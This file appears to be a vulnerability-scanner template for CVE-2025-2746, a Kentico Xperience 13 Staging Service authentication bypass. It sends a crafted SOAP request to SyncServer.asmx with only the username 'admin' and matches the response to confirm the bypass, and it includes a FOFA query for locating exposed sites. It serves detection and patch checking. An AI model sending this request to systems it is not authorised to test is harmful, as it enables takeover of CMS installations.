templates/CVE-2025-2746.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{rand}}'
    - <wsa:Action>
  - condition: or
    negative: true
    part: body
    type: word
    words:
    - Site not running
    - SyncServer.ErrorLicense
    - SyncServer.ErrorServiceNotEnabled
    - Staging service is not enabled on this server
    - Staging does not work with blank password
    - Missing X509 certificate token
    - The security token could not be authenticated or authorized
  - part: content_type
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - "POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: {{Hostname}}\nAccept:\
    \ */*\nContent-Type: text/xml; charset=utf-8\nSOAPAction: http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData\n\
    \n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <soap:Envelope xmlns:xsi=\"\
    http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
    \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Header>\n\
    \            <wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"\
    \ xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"\
    >\n                <wsse:UsernameToken>\n                    <wsse:Username>admin</wsse:Username>\n\
    \                </wsse:UsernameToken>\n            </wsse:Security>\n       \
    \ </soap:Header>\n        <soap:Body>\n            <ProcessSynchronizationTaskData\
    \ xmlns=\"http://localhost/SyncWebService/SyncServer\">\n                <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>\n\
    \            </ProcessSynchronizationTaskData>\n        </soap:Body>\n    </soap:Envelope>\n"
id: CVE-2025-2746
info:
  author: DhiyaneshDK
  classification:
    cve-id: CVE-2025-2746
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99425
    epss-score: 0.87412
  description: 'Before Kentico Xperience 13 Hotfix 173, this vulnerability can be
    exploited with any username provided. For Hotfix >= 173 and < 178, this vulnerability
    can be exploited only if you provide a valid Staging Service username (default:
    admin)

    '
  impact: 'Unauthenticated attackers can bypass authentication in the Staging Service
    using any username (or valid username depending on hotfix version), potentially
    gaining control of administrative objects and compromising the entire CMS.

    '
  metadata:
    fofa-query: app="Kentico-CMS"
    max-request: 1
    verified: true
  name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0011)
  reference:
  - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
  - https://devnet.kentico.com/download/hotfixes
  - https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
  remediation: 'Upgrade to Kentico Xperience 13 Hotfix 178 or later that properly
    validates Staging Service authentication.

    '
  severity: critical
  tags: cve,cve2025,kentico,stag,auth-bypass,xperience13,vuln,kev,vkev
variables:
  rand: '{{to_lower(rand_text_alpha(32))}}'
